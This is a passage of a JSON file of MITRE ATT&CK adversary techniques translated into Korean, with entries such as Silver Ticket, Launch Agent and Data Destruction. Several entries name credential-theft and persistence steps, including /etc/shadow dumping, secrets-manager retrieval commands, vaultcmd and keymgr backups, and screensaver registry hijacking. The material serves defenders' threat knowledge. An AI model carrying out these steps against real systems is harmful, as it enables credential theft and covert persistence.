제거하거나 조작하는 것을 포함합니다.",
    "external_id": "T1598",
    "modified": "2024-05-31T04:18:44.570Z",
    "translated": true
  },
  {
    "title": "Resource Hijacking",
    "description": "적대자들은 공동으로 활용된 시스템의 자원을 이용하여 자원 소모가 많은 작업을 완료할 수 있으며, 이는 시스템 또는 호스팅 서비스의 가용성에 영향을 미칠 수 있습니다.\n\n자원 탈취는 여러 가지 형태로 나타날 수 있습니다. 예를 들어, 적대자들은:\n\n* 채굴을 위해 컴퓨팅 자원을 활용할 수 있습니다.\n* 프록시 네트워크에 네트워크 대역폭을 판매할 수 있습니다.\n* 이익을 위해 SMS 트래픽을 생성할 수 있습니다.\n* 대량의 스팸 메시지를 전송하기 위해 클라우드 기반 메시징 서비스를 악용할 수 있습니다.\n\n어떤 경우에는, 적대자들이 여러 유형의 자원 탈취를 동시에 활용할 수도 있습니다.",
    "external_id": "T1496",
    "modified": "2024-10-13T17:00:09.759Z",
    "translated": true
  },
  {
    "title": "Establish Accounts",
    "description": "적대자는 표적 공격에 사용할 수 있는 서비스와 관련된 계정을 생성하고 관리할 수 있습니다. 이들은 작전을 지원하기 위해 페르소나를 구축하는 데 사용할 수 있는 계정을 만들 수 있습니다. 페르소나 개발은 공개 정보, 존재감, 이력 및 적절한 연계를 포함한 개발로 구성됩니다. 이러한 개발은 소셜 미디어, 웹사이트 또는 작전 중 사용될 페르소나나 신원의 정당성을 참조하고 검토할 수 있는 기타 공개 정보에 적용될 수 있습니다.\n\n소셜 엔지니어링을 포함하는 작전에서는 온라인 페르소나의 활용이 중요할 수 있습니다. 이러한 페르소나는 허구일 수도 있고 실제 사람을 모방할 수도 있습니다. 페르소나는 단일 사이트에 존재할 수도 있고 여러 사이트에 걸쳐 존재할 수도 있습니다. 페르소나를 설정하는 데는 그들이 실제처럼 보이도록 추가 문서 작성이 필요할 수 있습니다. 여기에는 프로필 정보 작성, 사회적 네트워크 개발 또는 사진 포함이 포함될 수 있습니다.\n\n계정을 설정하는 것은 이메일 제공업체와의 계정 생성도 포함될 수 있으며, 이는 정보 피싱 또는 피싱에 직접 활용될 수 있습니다. 또한, 계정을 설정하면 적대자가 무료 서비스를 남용하여 악의적인 목적으로 시험 기간에 등록하는 등의 방법으로 인프라를 확보할 수 있게 됩니다.",
    "external_id": "T1585",
    "modified": "2024-02-28T21:08:56.520Z",
    "translated": true
  },
  {
    "title": "Obtain Capabilities",
    "description": "적대자는 표적을 설정하는 데 사용할 수 있는 능력을 구매하거나 도둑질할 수 있습니다. 적대자는 자사에서 자체적인 능력을 개발하기보다는 구매하거나 무료로 다운로드하거나 탈취할 수 있습니다. 활동에는 악성 코드, 소프트웨어(라이선스 포함), 악용, 인증서 및 취약성과 관련된 정보의 획득이 포함될 수 있습니다. 적대자는 적대자 생애 주기의 여러 단계에서 그들의 작전을 지원하기 위한 능력을 획득할 수 있습니다.\n\n인터넷에서 무료 악성 코드, 소프트웨어 및 악용을 다운로드하는 것 외에도, 적대자는 이러한 능력을 제3자에서 구매할 수 있습니다. 제3자는 악성 코드와 악용을 전문으로 하는 기술 회사, 범죄 시장 또는 개인이 포함될 수 있습니다.\n\n능력을 구매하는 것 외에도, 적대자는 제3자(다른 적대자 포함)로부터 능력을 도둑질할 수 있습니다. 여기에는 소프트웨어 라이선스, 악성 코드, SSL/TLS 및 코드 서명 인증서의 도둑질 또는 취약점이나 악용의 폐쇄된 데이터베이스를 습격하는 것이 포함될 수 있습니다.",
    "external_id": "T1588",
    "modified": "2024-09-16T16:19:41.568Z",
    "translated": true
  },
  {
    "title": "Screensaver",
    "description": "적대자는 사용자 비활동이 감지되면 실행되는 악성 콘텐츠를 통해 지속성을 확보할 수 있습니다. 화면 보호기는 사용자가 설정한 비활동 시간 후에 실행되는 프로그램으로, .scr 파일 확장자를 가진 휴대용 실행 파일(PE)로 구성됩니다. Windows 화면 보호기 응용 프로그램인 scrnsave.scr는 64비트 Windows 시스템에서 <code>C:\\Windows\\System32\\</code>와 <code>C:\\Windows\\sysWOW64\\</code>에 위치하며, 기본 Windows 설치에 포함된 화면 보호기와 함께 제공됩니다.\n\n다음 화면 보호기 설정은 레지스트리에 저장되며 (<code>HKCU\\Control Panel\\Desktop\\</code>), 지속성을 달성하기 위해 조작될 수 있습니다:\n\n* <code>SCRNSAVE.exe</code> - 악성 PE 경로로 설정\n* <code>ScreenSaveActive</code> - 화면 보호기를 활성화하기 위해 '1'로 설정\n* <code>ScreenSaverIsSecure</code> - 잠금 해제를 위해 비밀번호가 필요하지 않도록 '0'으로 설정\n* <code>ScreenSaveTimeout</code> - 화면 보호기가 실행되기 전에 사용자 비활동 타임아웃 설정\n\n적대자는 비활동이 일정 시간 지속된 후 악성코드를 실행하도록 화면 보호기를 설정하여 지속성을 유지할 수 있습니다.",
    "external_id": "T1546.002",
    "modified": "2023-07-28T18:17:34.185Z",
    "translated": true
  },
  {
    "title": "Conditional Access Policies",
    "description": "적대자는 조건부 액세스 정책을 비활성화하거나 수정하여 침해된 계정에 대한 지속적인 액세스를 가능하게 할 수 있습니다. 조건부 액세스 정책은 신원 제공자와 신원 및 액세스 관리 시스템이 사용자가 리소스에 대한 액세스를 허가받아야 하는지 판단하기 위해 사용하는 추가 검증 방법입니다.\n\n사용자는 IP 주소, 장치 등록 상태 및 다단계 인증의 사용에 따라 애플리케이션에 대한 액세스가 거부될 수 있습니다. 경우에 따라 신원 제공자는 다양한 지표에 기반하여 로그인 거부를 위해 위험 기반 메트릭의 사용도 지원할 수 있습니다. IAM 정책은 요청의 출발 IP, 요청이 이루어진 날짜, 요청된 리소스 또는 지역의 성격 등 임의의 제약조건을 검증하는 `condition` 속성을 포함할 수 있습니다. 이러한 조치는 침해된 자격 증명이 데이터나 리소스에 대한 무단 액세스로 이어지지 않도록 도와주며, 사용자 권한을 필요한 만큼만 제한하는 역할을 합니다.\n\n적대자는 조건부 액세스 정책을 수정하여 신뢰할 수 있는 IP 범위를 추가하거나 다단계 인증 요구 사항을 제거하거나 추가적인 클라우드 지역을 허용함으로써 계정에 대한 지속적인 액세스를 보장하고 방어 조치를 우회할 수 있습니다.",
    "external_id": "T1556.009",
    "modified": "2024-09-16T16:54:47.595Z",
    "translated": true
  },
  {
    "title": "Create Cloud Instance",
    "description": "적대자는 클라우드 계정의 컴퓨팅 서비스 내에서 새로운 인스턴스나 가상 머신(VM)을 생성하여 방어를 회피할 수 있습니다. 새로운 인스턴스를 생성하면 적대자는 현재 계정 내에 수집된 인스턴스에 존재하는 방화벽 규칙 및 권한을 우회할 수 있습니다. 적대자는 계정 내의 하나 이상의 볼륨에 대한 스냅샷을 생성하고 새로운 인스턴스를 만들어 스냅샷을 마운트한 다음, 데이터 수집이나 원격 데이터 스테이징을 위해 덜 제한적인 보안 정책을 적용할 수 있습니다.\n\n새로운 인스턴스를 생성하는 것은 적대자가 현재 실행 중인 인스턴스의 실행에 영향을 미치지 않고 환경 내에서 악의적인 활동을 수행할 수 있도록 할 수도 있습니다.",
    "external_id": "T1578.002",
    "modified": "2024-09-30T13:28:37.416Z",
    "translated": true
  },
  {
    "title": "Cloud Secrets Management Stores",
    "description": "적대자는 AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, Terraform Vault와 같은 클라우드 네이티브 비밀 관리 솔루션에서 자격 증명을 획득할 수 있습니다.\n\n비밀 관리자는 비밀번호, API 키 및 기타 자격 증명 자료의 보안 중앙 관리를 지원합니다. 비밀 관리자를 사용하는 경우 클라우드 서비스는 평문 파일이나 환경 변수에 안전하지 않게 저장된 비밀에 접근하는 대신 API 요청을 통해 자격 증명을 동적으로 획득할 수 있습니다.\n\n적대자가 클라우드 환경에서 충분한 권한을 얻을 수 있다면, 예를 들어 높은 권한의 클라우드 계정 자격 증명을 획득하거나 비밀을 검색할 권한이 있는 서비스를 타협함으로써, 비밀 관리자에게 비밀을 요청할 수 있습니다. 이는 AWS의 `get-secret-value`, GCP의 `gcloud secrets describe`, Azure의 `az key vault secret show`와 같은 명령을 통해 수행할 수 있습니다.\n\n**주:** 이 기술은 인스턴스 메타데이터 API를 통해서가 아니라 클라우드 비밀 관리자에서 자격 증명을 직접 요청한다는 점에서 구별됩니다.",
    "external_id": "T1555.006",
    "modified": "2024-10-15T14:20:16.722Z",
    "translated": true
  },
  {
    "title": "Transmitted Data Manipulation",
    "description": "적대자는 외부 결과를 조작하거나 활동을 숨기기 위해 저장소나 기타 시스템으로 이동하는 데이터의 변경을 시도할 수 있으며, 이는 데이터의 무결성을 위협합니다. 전송된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n조작은 네트워크 연결을 통해 또는 시스템 프로세스 간에 정보가 가로채지고 변경될 수 있는 도구를 배치할 기회가 있을 때 가능할 수 있습니다. 수정의 유형과 그 영향은 목표 전송 메커니즘 및 적대자의 목표와 목적에 따라 다릅니다. 복잡한 시스템에 대해서는 적대자가 원하는 영향을 미치기 위해 특별한 전문 지식과 일반적으로 상당한 시간에 걸쳐 정보 수집 캠페인을 통해 얻는 특별한 소프트웨어에 접근해야 할 가능성이 높습니다.",
    "external_id": "T1565.002",
    "modified": "2024-08-26T16:33:33.983Z",
    "translated": true
  },
  {
    "title": "/etc/passwd and /etc/shadow",
    "description": "적대자는 오프라인 비밀번호 크래킹을 가능하게 하기 위해 <code>/etc/passwd</code>와 <code>/etc/shadow</code>의 내용을 덤프하려고 시도할 수 있습니다. 대부분의 현대 Linux 운영 체제는 <code>/etc/passwd</code>와 <code>/etc/shadow</code>의 조합을 사용하여 비밀번호 해시를 포함한 사용자 계정 정보를 저장합니다. 기본적으로 <code>/etc/shadow</code>는 루트 사용자만 읽을 수 있습니다.\n\nLinux 유틸리티인 unshadow는 비밀번호 크래킹 유틸리티에 적합한 형식으로 두 파일을 결합하는 데 사용할 수 있습니다.",
    "external_id": "T1003.008",
    "modified": "2024-09-25T20:48:04.491Z",
    "translated": true
  },
  {
    "title": "Launch Agent",
    "description": "적대자는 지속성을 유지하기 위해 악성 페이로드를 반복적으로 실행하기 위해 실행 에이전트를 생성하거나 수정할 수 있습니다. 사용자가 로그인하면 각 사용자 지정 실행 에이전트에 대한 매개변수를 로드하는 사용자별 launchd 프로세스가 시작되며, 이 정보는 <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, 및 <code>~/Library/LaunchAgents</code>에 있는 속성 목록(.plist) 파일에서 찾을 수 있습니다. 속성 목록 파일은 <code>Label</code>, <code>ProgramArguments</code>, 및 <code>RunAtLoad</code> 키를 사용하여 실행 에이전트의 이름, 실행 파일 위치 및 실행 시간을 식별합니다. 실행 에이전트는 프로그램 업데이트를 수행하거나 사용자가 지정한 프로그램을 로그인 시 실행하거나 기타 개발자 작업을 수행하기 위해 설치되는 경우가 많습니다.\n\n실행 에이전트는 [Launchctl] 명령어를 사용하여 실행될 수도 있습니다.\n\n적대자는 <code>RunAtLoad</code> 또는 <code>KeepAlive</code> 키를 <code>true</code>로 설정하여 적절한 폴더에 .plist 파일을 배치함으로써 로그인 시 실행되는 새로운 실행 에이전트를 설치할 수 있습니다. 실행 에이전트 이름은 관련 운영 체제 또는 무해한 소프트웨어의 이름을 사용하여 위장될 수 있습니다. 실행 에이전트는 사용자 수준 권한으로 생성되며 사용자 수준 권한으로 실행됩니다.",
    "external_id": "T1543.001",
    "modified": "2022-04-21T16:13:00.598Z",
    "translated": true
  },
  {
    "title": "System Services",
    "description": "적대자는 시스템 서비스나 데몬을 악용하여 명령이나 프로그램을 실행할 수 있습니다. 적대자는 서비스를 로컬 또는 원격으로 상호 작용하거나 생성함으로써 악성 콘텐츠를 실행할 수 있습니다. 많은 서비스가 부팅 시 실행되도록 설정되어 있어 지속성을 유지하는 데 도움이 될 수 있지만, 적대자는 또한 서비스를 일회성 또는 임시 실행을 위해 악용할 수 있습니다.",
    "external_id": "T1569",
    "modified": "2024-09-20T19:55:40.527Z",
    "translated": true
  },
  {
    "title": "Windows Command Shell",
    "description": "대적자는 실행을 위해 Windows 명령 셸을 악용할 수 있습니다. Windows 명령 셸은 Windows 시스템에서 기본 명령 프롬프트입니다. Windows 명령 프롬프트는 시스템의 거의 모든 측면을 제어하는 데 사용될 수 있으며, 다양한 명령 집합에 따라 필요한 권한 수준이 다릅니다. 명령 프롬프트는 원격 서비스(예: SSH)를 통해 원격으로 호출될 수 있습니다.\n\n배치 파일(.bat 또는 .cmd)은 셸에 실행할 명령의 순차 목록을 제공하며, 조건문 및 반복문과 같은 일반 스크립트 작업도 수행할 수 있습니다. 배치 파일의 일반적인 용도에는 긴 작업이나 반복적인 작업, 또는 여러 시스템에서 동일한 명령 세트를 실행해야 할 경우가 포함됩니다.\n\n대적자는 다양한 명령과 페이로드를 실행하기 위해 cmd를 활용할 수 있습니다. 일반적인 용도에는 단일 명령을 실행하거나 명령 및 제어 채널을 통해 입력 및 출력을 전달하면서 cmd를 대화형으로 악용하는 것이 포함됩니다.",
    "external_id": "T1059.003",
    "modified": "2024-10-15T15:19:56.540Z",
    "translated": true
  },
  {
    "title": "Proc Memory",
    "description": "적대자는 /proc 파일 시스템을 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고 권한 상승을 시도할 수 있습니다. Proc 메모리 주입은 별도의 실시간 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nProc 메모리 주입은 /proc 파일 시스템을 통해 프로세스의 메모리를 열거한 후, 사용 가능한 가젯 및 명령어로 리턴 지향 프로그래밍(ROP) 페이로드를 구성하는 과정입니다. 각 실행 중인 프로세스에는 고유의 디렉터리가 있으며, 여기에는 메모리 매핑 정보가 포함되어 있습니다. Proc 메모리 주입은 일반적으로 /proc 파일 시스템에서 제공하는 메모리 매핑을 사용하여 대상 프로세스의 스택을 덮어쓰는 방식으로 수행됩니다. 이 정보는 오프셋(스택 포함)과 가젯(악성 페이로드를 구성하는 데 사용할 수 있는 프로그램 내 명령어) 등을 열거하는 데 사용될 수 있으며, 이는 주소 공간 배치 무작위화(ASLR)와 같은 프로세스 메모리 보호로 인해 숨겨져 있을 수 있습니다. 일단 열거되면, <code>/proc/[pid]/maps</code> 내에서 대상 프로세스의 메모리 맵을 dd 명령어를 사용하여 덮어쓸 수 있습니다.\n\n[동적 링커 하이재킹]과 같은 다른 기술을 사용하여 대상 프로세스에 더 많은 가젯을 추가할 수 있습니다. [프로세스 홀로잉]과 유사하게, proc 메모리 주입은 자식 프로세스(백그라운드에서 실행 중인 sleep의 복사본 등)를 목표로 할 수 있습니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 리소스에 접근하거나 권한 상승을 시도할 수 있습니다. Proc 메모리 주입을 통한 실행은 정당한 프로세스 아래에서 실행이 은폐되므로 보안 제품의 탐지를 회피할 수 있습니다.",
    "external_id": "T1055.009",
    "modified": "2020-06-20T22:25:55.331Z",
    "translated": true
  },
  {
    "title": "Acquire Access",
    "description": "적대 세력은 대상 시스템이나 네트워크에 대한 기존 액세스를 구매하거나 다른 방법으로 취득할 수 있습니다. 다양한 온라인 서비스와 초기 액세스 중개 네트워크가 제공되어 이전에 침해된 시스템에 대한 액세스를 판매하고 있습니다. 경우에 따라, 적대 그룹은 서로 침해된 시스템을 공유하기 위해 파트너십을 형성할 수 있습니다.\n\n침해된 시스템에 대한 발판은 심어 놓은 백도어에 대한 액세스나 외부 원격 서비스 등을 통한 설정된 액세스와 같은 다양한 형태를 취할 수 있습니다. 경우에 따라, 액세스 브로커는 침해된 시스템에 추가 맬웨어를 설치할 수 있는 \"로드\"를 심어주기도 합니다.\n\n기존의 액세스 중개 네트워크를 활용함으로써 자신의 초기 액세스 능력을 개발하거나 확보하는 대신, 적대자는 대상 네트워크에서 발판을 얻기 위해 필요한 리소스를 줄일 수 있으며 공격의 후속 단계에 집중할 수 있습니다. 적대자는 보안 모니터링이 부족하거나 높은 권한을 가진 시스템, 또는 특정 부문에 속한 조직의 시스템에 대한 액세스를 우선적으로 확보할 수 있습니다.\n\n경우에 따라 IT 계약, 소프트웨어 개발, 통신과 같은 부문 내의 조직에 대한 액세스를 구매하면 적대자는 신뢰 관계, 다중 인증 가로채기, 또는 공급망 침해를 통해 추가 피해자를 침해할 수 있습니다.\n\n**참고:** 이 기법은 기술 데이터 구매 및 자격 증명과 같은 다른 행동과는 구별되지만, 종종 함께 사용될 수 있습니다(특히 획득한 발판이 유효한 계정을 요구하는 경우).",
    "external_id": "T1650",
    "modified": "2023-04-14T20:04:42.893Z",
    "translated": true
  },
  {
    "title": "Patch System Image",
    "description": "위협자는 네트워크 장치의 운영 체제를 수정하여 새로운 기능을 추가하거나 기존 방어를 약화시킬 수 있습니다. 일부 네트워크 장치는 단일 파일 내에 전체 운영 체제와 대부분의 기능이 포함된 단일 아키텍처로 설계되어 있습니다. 위협자는 이 파일을 저장소에서 변경하여 향후 부팅 시 로드되거나 런타임 중 메모리에서 수정할 수 있습니다.\n\n저장소에 있는 운영 체제를 변경하기 위해 위협자는 일반적으로 장치 운영자에게 제공되는 표준 절차를 사용합니다. 이는 TFTP, FTP, SCP 또는 콘솔 연결과 같은 네트워크 장치에서 사용되는 일반적인 프로토콜을 통해 새 파일을 다운로드하는 작업을 포함할 수 있습니다. 원본 파일은 덮어쓰거나, 새로운 파일이 그 옆에 작성되어 손상된 이미지를 부팅하도록 장치를 재구성할 수 있습니다.\n\n메모리의 운영 체제를 변경하기 위해 위협자는 일반적으로 두 가지 방법 중 하나를 사용할 수 있습니다. 첫 번째 방법에서는 위협자가 원본 운영 체제에서 제공되는 기본 디버그 명령을 사용하여 실행 중인 운영 체제를 포함하는 관련 메모리 주소를 직접 수정할 수 있습니다. 이 방법은 일반적으로 장치에 대한 관리자 수준의 접근이 필요합니다.\n\n두 번째 방법에서 위협자는 부트 로더를 이용합니다. 부트 로더는 장치가 시작될 때 로드되는 첫 번째 소프트웨어로, 운영 체제를 실행합니다. 위협자는 부트 로더에 미리 심어둔 악성 코드를 사용하여 실행 중인 운영 체제 코드를 메모리에서 직접 조작할 수 있습니다. 부트 로더의 악성 코드는 위협자가 런타임 동안 라이브 운영 체제를 패치할 수 있는 직접 메모리 조작 기능을 제공합니다.\n\n시스템 이미지 파일에 저장된 명령을 수정함으로써 위협자는 기존 방어를 약화시키거나 장치에서 이전에 없었던 새로운 기능을 제공할 수 있습니다. 방해를 받을 수 있는 기존 방어의 예로는 암호화, 인증 및 경계 방어가 있습니다. 위협자의 목적을 위해 추가된 새로운 기능의 예로는 키로깅, 다중 홉 프록시 및 포트 노킹이 있습니다.\n\n위협자는 또한 운영 체제에서 기존 명령을 손상시켜 방어자를 오도하는 잘못된 출력을 생성할 수 있습니다. 이 방법이 시스템 이미지 다운그레이드와 함께 사용될 때, 손상된 시스템 명령의 한 예는 현재 실행 중인 운영 체제의 버전을 표시하는 명령의 출력을 변경하는 것입니다. 운영 체제를 패치함으로써 위협자는 이 명령을 변경하여 시스템 다운그레이드를 통해 교체된 원본의 높은 수정 번호를 표시하도록 할 수 있습니다.\n\n운영 체제가 저장소에서 패치될 때, 이는 거주 저장소(일반적으로 비휘발성 플래시 메모리 형태)에서 이루어지거나 TFTP 부팅을 통해 이루어질 수 있습니다. \n\n메모리에 있는 실행 중인 운영 체제에서 이 기법이 수행되고 저장된 복사본에서 수행되지 않으면 이 기술은 재부팅 동안 생존하지 않습니다. 그러나 운영 체제를 라이브 메모리에서 수정하는 것은 ROMMONkit과 결합하여 지속성을 확보할 수 있습니다.",
    "external_id": "T1601.001",
    "modified": "2020-10-22T17:50:46.560Z",
    "translated": true
  },
  {
    "title": "Silver Ticket",
    "description": "대상 서비스 계정(예: SharePoint, MSSQL)의 비밀번호 해시를 가진 공격자는 Kerberos 티켓 부여 서비스(TGS) 티켓, 즉 실버 티켓을 위조할 수 있습니다. Kerberos TGS 티켓은 서비스 티켓으로도 알려져 있습니다.\n\n실버 티켓은 특정 리소스(예: MSSQL)와 해당 리소스를 호스팅하는 시스템에만 접근할 수 있게 하는 점에서 골든 티켓보다 범위가 더 제한적입니다. 그러나 골든 티켓과는 달리 실버 티켓을 위조할 수 있는 공격자는 키 배포 센터(KDC)와 상호 작용하지 않고 TGS 티켓을 생성할 수 있어 탐지가 더욱 어려워질 수 있습니다.\n\n대상 서비스의 비밀번호 해시는 OS 자격 증명 덤핑 또는 커버로스팅을 통해 얻을 수 있습니다.",
    "external_id": "T1558.002",
    "modified": "2020-03-25T21:46:46.831Z",
    "translated": true
  },
  {
    "title": "Data from Information Repositories",
    "description": "적대자는 정보 저장소를 활용하여 귀중한 정보를 채굴할 수 있습니다. 정보 저장소는 사용자가 협업이나 정보 공유를 용이하게 하기 위해 정보를 저장할 수 있는 도구로, 자격 증명 접근, 측면 이동 또는 방어 회피, 또는 목표 정보에 대한 직접 접근과 같은 추가 목표를 지원할 수 있는 다양한 데이터를 저장할 수 있습니다. 적대자는 또한 외부 공유 기능을 악용하여 조직 외부의 수신자와 민감한 문서를 공유할 수 있습니다.\n\n다음은 적대자에게 잠재적 가치를 지닐 수 있고 정보 저장소에서 발견될 수 있는 정보의 간단한 목록입니다:\n\n* 정책, 절차 및 기준\n* 물리적 / 논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트 / 개발 자격 증명\n* 업무 / 프로젝트 일정\n* 소스 코드 조각\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크\n* 비즈니스 파트너 및 고객에 대한 연락처 또는 기타 민감한 정보, 개인 식별 정보(PII) 포함 \n\n저장소에 저장된 정보는 특정 상황이나 환경에 따라 달라질 수 있습니다. 일반적인 정보 저장소의 예는 다음과 같습니다:\n\n* IaaS 데이터베이스, 기업 데이터베이스 및 고객 관계 관리(CRM) 데이터베이스와 같은 특수화된 플랫폼을 포함한 저장 서비스 \n* SharePoint, Confluence 및 코드 저장소와 같은 협업 플랫폼 \n* Slack 및 Microsoft Teams와 같은 메시징 플랫폼 \n\n일부 경우, 정보 저장소는 일반적으로 사용자나 인증되지 않은 사용자에게 지나치게 넓은 접근을 허용함으로써 적절히 보호되지 않았습니다. 이는 AWS 관계형 데이터베이스 서비스(RDS), Redis 또는 ElasticSearch와 같은 클라우드 기반 또는 클라우드 호스팅 서비스에서 특히 흔하게 발생합니다.",
    "external_id": "T1213",
    "modified": "2024-10-28T19:10:16.960Z",
    "translated": true
  },
  {
    "title": "Clear Persistence",
    "description": "적대자는 호스트 시스템에서 이전에 확립된 지속성을 나타내는 아티팩트를 지워 그들의 활동에 대한 증거를 제거할 수 있습니다. 이는 서비스 제거, 실행 파일 삭제, 레지스트리 수정, 플리스트 파일 수정 또는 방어자가 그들의 지속적인 존재에 대한 증거를 수집하는 것을 방지하기 위한 기타 정리 방법과 같은 다양한 조치를 포함할 수 있습니다. 적대자는 또한 지속성을 유지하기 위해 이전에 생성된 계정을 삭제할 수도 있습니다.\n\n일부 경우, 적대자의 지속성이 실행된 후, 새로운 악성코드 인스턴스와의 오류를 방지하기 위해 지속성의 아티팩트가 제거되기도 합니다.",
    "external_id": "T1070.009",
    "modified": "2023-04-11T22:30:01.227Z",
    "translated": true
  },
  {
    "title": "Windows Credential Manager",
    "description": "적 adversaries는 Windows 자격 증명 관리자에서 자격 증명을 획득할 수 있습니다. 자격 증명 관리자는 NTLM 또는 Kerberos를 통해 인증을 요청하는 웹사이트, 애플리케이션 및/또는 장치에 로그인하기 위한 자격 증명을 Credential Lockers(이전에는 Windows Vaults로 알려짐)에 저장합니다.\n\nWindows 자격 증명 관리자는 웹사이트 자격 증명과 애플리케이션 또는 네트워크 자격 증명을 두 개의 잠금 상자에서 구분합니다. 웹 브라우저에서의 자격 증명 관리의 일환으로, Internet Explorer와 Microsoft Edge의 웹사이트 자격 증명은 자격 증명 관리자가 관리하며 웹 자격 증명 잠금 상자에 저장됩니다. 애플리케이션 및 네트워크 자격 증명은 Windows 자격 증명 잠금 상자에 저장됩니다.\n\n자격 증명 잠금 상자는 암호화된 `.vcrd` 파일에 자격 증명을 저장하며, 이 파일은 `%Systemdrive%\\Users\\[Username]\\AppData\\Local\\Microsoft\\[Vault/Credentials]` 경로에 위치합니다. 암호화 키는 일반적으로 자격 증명과 같은 폴더 안에 있는 <code>Policy.vpol</code>라는 파일에서 찾을 수 있습니다.\n\n적 adversaries는 여러 메커니즘을 통해 Windows 자격 증명 관리자가 관리하는 자격 증명을 나열할 수 있습니다. <code>vaultcmd.exe</code>는 자격 증명 잠금 상자에 저장된 자격 증명을 명령줄 인터페이스를 통해 열거할 수 있는 Windows 네이티브 실행 파일입니다. 적 adversaries는 또한 자격 증명 잠금 상자 내의 파일을 직접 읽음으로써 자격 증명을 수집할 수 있습니다. <code>CredEnumerateA</code>와 같은 Windows API도 자격 증명 관리자가 관리하는 자격 증명을 나열하는 데 악용될 수 있습니다.\n\n적 adversaries는 자격 증명 백업에서도 자격 증명을 획득할 수 있습니다. 자격 증명 백업 및 복원은 <code>rundll32.exe keymgr.dll KRShowKeyMgr</code>를 실행한 후 \"저장된 사용자 이름 및 비밀번호\" GUI에서 \"백업...\" 버튼을 선택하여 수행할 수 있습니다.\n\n비밀번호 복구 도구는 자격 증명 관리자에서 일반 텍스트 비밀번호도 획득할 수 있습니다.",
    "external_id": "T1555.004",
    "modified": "2024-10-15T16:44:35.906Z",
    "translated": true
  },
  {
    "title": "Hardware Additions",
    "description": "적대 세력은 시스템이나 네트워크에 컴퓨터 액세서리, 네트워킹 하드웨어 또는 다른 컴퓨팅 장치를 도입하여 접근할 수 있는 경로로 사용할 수 있습니다. 단순히 이동식 저장 장치를 통해 페이로드를 연결하고 배포하는 것보다, 보다 강력한 하드웨어 추가를 통해 시스템에 새로운 기능이나 특징을 도입할 수 있으며, 이를 악용할 수 있습니다.\n\n위협 행위자에 의한 사용에 대한 공공의 언급은 드물지만, 많은 레드 팀이나 침투 테스트 담당자들은 초기 접근을 위해 하드웨어 추가를 활용합니다. 상용 및 오픈 소스 제품은 수동 네트워크 감청, 네트워크 트래픽 수정, 키스트로크 주입, DMA를 통한 커널 메모리 읽기, 기존 네트워크에 대한 새로운 무선 접근 추가 등과 같은 기능을 통해 활용될 수 있습니다.",
    "external_id": "T1200",
    "modified": "2023-03-30T21:01:40.332Z",
    "translated": true
  },
  {
    "title": "Server Software Component",
    "description": "적대자는 서버의 합법적인 확장 개발 기능을 악용하여 시스템에 지속적으로 접근할 수 있는 방법을 구축할 수 있습니다. 기업 서버 애플리케이션에는 개발자가 소프트웨어나 스크립트를 작성하고 설치하여 주요 애플리케이션의 기능을 확장할 수 있는 기능이 포함될 수 있습니다. 적대자는 악성 구성 요소를 설치하여 서버 애플리케이션을 확장하고 악용할 수 있습니다.",
    "external_id": "T1505",
    "modified": "2022-10-19T21:18:29.349Z",
    "translated": true
  },
  {
    "title": "Data Destruction",
    "description": "적대자는 특정 시스템이나 네트워크의 대량 파일 및 데이터를 파괴하여 시스템, 서비스 및 네트워크 리소스의 가용성을 중단시킬 수 있습니다. 데이터 파괴는 파일이나 데이터를 로컬 및 원격 드라이브에서 덮어쓰기를 통해 포렌식 기법으로 저장된 데이터를 복구할 수 없도록 만드는 경우가 많습니다. 일반적인 운영 체제 파일 삭제 명령인 <code>del</code>과 <code>rm</code>은 종종 파일의 내용을 지우지 않고 파일에 대한 포인터만 제거하여 적절한 포렌식 방법론으로 파일을 복구할 수 있도록 만듭니다. 이러한 행동은 저장 디스크의 섹션이나 디스크의 논리 구조가 아니라 개별 파일이 파괴되므로 [디스크 내용 삭제] 및 [디스크 구조 삭제]와 다릅니다.\n\n적대자는 무작위로 생성된 데이터로 파일과 디렉터리를 덮어써서 복구할 수 없도록 만들려 할 수 있습니다. 일부 경우에는 정치적으로 지향된 이미지 파일이 데이터를 덮어쓰는 데 사용되었습니다.\n\n네트워크 전반의 가용성 중단이 목표인 작업에서 대상 조직에 대한 영향을 극대화하기 위해 데이터 파괴를 위해 설계된 악성 코드는 [유효 계정], [운영 체제 자격 증명 덤프], 및 [SMB/Windows 관리자 공유]와 같은 추가 기술을 활용하여 네트워크를 통해 전파하는 웜과 같은 기능을 가질 수 있습니다.\n\n클라우드 환경에서는 적대자가 클라우드 저장소 객체, 머신 이미지, 데이터베이스 인스턴스 및 운영에 중요한 다른 인프라를 삭제하는 접근을 활용하여 조직이나 그 고객에게 피해를 줄 수 있습니다.",
    "external_id": "T1485",
    "modified": "2024-09-25T20:46:14.641Z",
    "translated": true
  },
  {
    "title": "Non-Standard Encoding",
    "description": "대적자는 명령 및 제어 트래픽의 내용을 탐지하기 더 어렵게 만들기 위해 비표준 데이터 인코딩 시스템으로 데이터를 인코딩할 수 있습니다. 명령 및 제어(C2) 정보는 기존 프로토콜 사양과 다르게 비표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 비표준 데이터 인코딩 방식은 HTTP 요청의 메시지 본문을 위한 수정된 Base64 인코딩처럼 표준 데이터 인코딩 방식에 기반하거나 관련될 수 있습니다.",
    "external_id": "T1132.002",
    "modified": "2020-03-14T23:39:50.117Z",
    "translated": true
  },
  {
    "title": "Domain Controller Authentication",
